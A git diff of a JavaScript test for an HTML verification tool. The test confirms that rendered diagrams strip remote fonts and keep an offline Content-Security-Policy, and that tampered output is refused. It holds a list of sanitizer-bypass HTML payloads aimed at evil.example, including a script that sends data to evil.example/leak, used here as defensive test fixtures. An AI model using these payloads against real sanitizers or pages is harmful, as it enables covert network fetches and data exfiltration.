@@ -795,7 +795,7 @@ test("standard profile still renders through trusted stock Archify", async (cont
   });
 });
 
-test("standard HTML honors network_access_from_html: remote font loads are removed and verify rejects any remote fetch", async (context) => {
+test("standard HTML honors network_access_from_html: fonts removed, exact CSP, and any HTML edit is refused", async (context) => {
   if (!needsArchify(context)) return;
   await temp(async (directory) => {
     const model = await copyModel(directory, readyFixture);
@@ -806,18 +806,14 @@ test("standard HTML honors network_access_from_html: remote font loads are remov
     assert.doesNotMatch(html, /fonts\.googleapis\.com|fonts\.gstatic\.com/u);
     assert.doesNotMatch(html, /\b(?:href|src)\s*=\s*["']?\s*(?:https?:)?\/\//iu);
     assert.match(html, /remote font loads removed/u);
-    // Mutation: put a remote stylesheet back, rebind the digest, and verify must refuse it.
-    const tampered = html.replace("</head>", "<link rel=\"stylesheet\" href=\"https://example.com/a.css\">\n</head>");
-    assert.notEqual(tampered, html);
-    await writeFile(outputs.html, tampered);
-    const manifest = JSON.parse(await readFile(manifestFile, "utf8"));
-    manifest.subjects.find((item) => item.role === "diagram_html").digest.value = sha(Buffer.from(tampered));
-    await writeFile(manifestFile, `${JSON.stringify(manifest, null, 2)}\n`);
-    const verify = run(["verify", manifestFile, "--archify-dir", stockArchify]);
-    assert.equal(verify.status, 1, verify.stdout);
-    assert.equal(body(verify.stderr).error.code, "NETWORK_ACCESS_DENIED");
-    // Every fetch vector reviewers named must also be refused, one at a time.
-    const vectors = {
+    const csp = html.match(/  <meta http-equiv="Content-Security-Policy" content="[^"]*">\n/u);
+    assert.ok(csp, "offline CSP is present");
+    assert.match(csp[0], /default-src 'none'/u);
+    assert.match(csp[0], /connect-src 'none'/u);
+    // Every bypass reviewers named is refused. Edits that break the CSP anchor fail with
+    // NETWORK_ACCESS_DENIED; every other edit fails the deterministic re-render comparison.
+    const injections = {
+      remoteStylesheet: "<link rel=\"stylesheet\" href=\"https://example.com/a.css\">",
       metaRefresh: "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
       metaRefreshWithoutUrlKey: "<meta http-equiv=\"refresh\" content=\"0; //evil.example\">",
       longAmbiguousTag: `<script-x a=${"a=".repeat(20000)} src=//evil.example/x></script-x>`,
@@ -825,25 +821,22 @@ test("standard HTML honors network_access_from_html: remote font loads are remov
       srcdoc: "<iframe title=\"x\" srcdoc=\"&lt;p&gt;x&lt;/p&gt;\"></iframe>",
       cssEscapedUrl: "<style>body{background:url(https\\3A //evil.example/)}</style>",
       entityEncodedHref: "<link rel=\"icon\" href=\"https&#58;//evil.example/i.png\">",
-      styleAttribute: "<div style=\"background:url(//evil.example/a)\"></div>",
-      srcsetDataThenRemote: "<img alt=\"\" srcset=\"data:image/png;base64,AAAA 1x, https://evil.example/t.png 2x\">",
       quotedGreaterThan: "<link title=\">\" rel=\"stylesheet\" href=\"https://evil.example/a.css\">",
-      apostropheInUnquotedValue: "<img alt=a'b src=//evil.example/x.png>",
-      outOfRangeEntity: "<link title=\"&#x110000;\" rel=\"stylesheet\" href=\"https://evil.example/a.css\">"
+      abruptCommentClose: "<!--><img alt=\"\" src=//evil.example/x>",
+      caseFoldPadding: `<!--${"\u0130 ".repeat(100)}--><script></script><meta http-equiv=refresh content="0;url=https://evil.example">`,
+      rawTextInsideTextarea: "<textarea><script></textarea><img alt=\"\" src=//evil.example/x.png>",
+      lookalikeEndTag: "<style>x</stylez body{background:url(https://evil.example/)}</style>",
+      whitespaceOnly: " "
     };
-    const csp = html.match(/  <meta http-equiv="Content-Security-Policy" content="[^"]*">\n/u);
-    assert.ok(csp, "offline CSP is present");
-    assert.match(csp[0], /default-src 'none'/u);
-    assert.match(csp[0], /connect-src 'none'/u);
     const edits = [
-      ...Object.entries(vectors).map(([name, vector]) => [name, html.replace("</head>", `${vector}\n</head>`)]),
-      ["cspRemoved", html.replace(csp[0], "")],
-      ["cspWeakened", html.replace(csp[0], csp[0].replace("default-src 'none'", "default-src *"))],
-      ["cspMovedAfterScript", html.replace(csp[0], "").replace("</head>", `${csp[0]}</head>`)],
-      ["unterminatedQuoteAtEnd", `${html}<img src=//evil.example/x.png alt="x>`],
-      ["cspCommentedOut", html.replace(`  <meta charset="UTF-8">\n${csp[0]}`, `  <!--\n  <meta charset="UTF-8">\n${csp[0]}  -->\n`).replace("</head>", "<script>fetch(\"https://evil.example/leak\")</script>\n</head>")]
+      ...Object.entries(injections).map(([name, vector]) => [name, html.replace("</head>", `${vector}\n</head>`), "CROSS_VIEW_PARITY_FAILED"]),
+      ["unterminatedQuoteAtEnd", `${html}<img src=//evil.example/x.png alt="x>`, "CROSS_VIEW_PARITY_FAILED"],
+      ["cspRemoved", html.replace(csp[0], ""), "NETWORK_ACCESS_DENIED"],
+      ["cspWeakened", html.replace(csp[0], csp[0].replace("default-src 'none'", "default-src *")), "NETWORK_ACCESS_DENIED"],
+      ["cspMovedAfterScript", html.replace(csp[0], "").replace("</head>", `${csp[0]}</head>`), "NETWORK_ACCESS_DENIED"],
+      ["cspCommentedOut", html.replace(`  <meta charset="UTF-8">\n${csp[0]}`, `  <!--\n  <meta charset="UTF-8">\n${csp[0]}  -->\n`).replace("</head>", "<script>fetch(\"https://evil.example/leak\")</script>\n</head>"), "NETWORK_ACCESS_DENIED"]
     ];
-    for (const [name, injected] of edits) {
+    for (const [name, injected, code] of edits) {
       assert.notEqual(injected, html, name);
       await writeFile(outputs.html, injected);
       const current = JSON.parse(await readFile(manifestFile, "utf8"));
@@ -851,10 +844,17 @@ test("standard HTML honors network_access_from_html: remote font loads are remov
       await writeFile(manifestFile, `${JSON.stringify(current, null, 2)}\n`);
       const startedAt = Date.now();
       const refused = run(["verify", manifestFile, "--archify-dir", stockArchify]);
-      assert.ok(Date.now() - startedAt < 15000, `${name}: verify must stay linear-time`);
+      assert.ok(Date.now() - startedAt < 15000, `${name}: verify must stay bounded`);
       assert.equal(refused.status, 1, `${name}: ${refused.stdout}`);
-      assert.equal(body(refused.stderr).error.code, "NETWORK_ACCESS_DENIED", `${name}: ${refused.stderr}`);
+      assert.equal(body(refused.stderr).error.code, code, `${name}: ${refused.stderr}`);
     }
+    // Restoring the rendered bytes restores verification.
+    await writeFile(outputs.html, html);
+    const restored = JSON.parse(await readFile(manifestFile, "utf8"));
+    restored.subjects.find((item) => item.role === "diagram_html").digest.value = sha(Buffer.from(html));
+    await writeFile(manifestFile, `${JSON.stringify(restored, null, 2)}\n`);
+    const ok = run(["verify", manifestFile, "--archify-dir", stockArchify]);
+    assert.equal(ok.status, 0, ok.stderr);
   });
 });
 
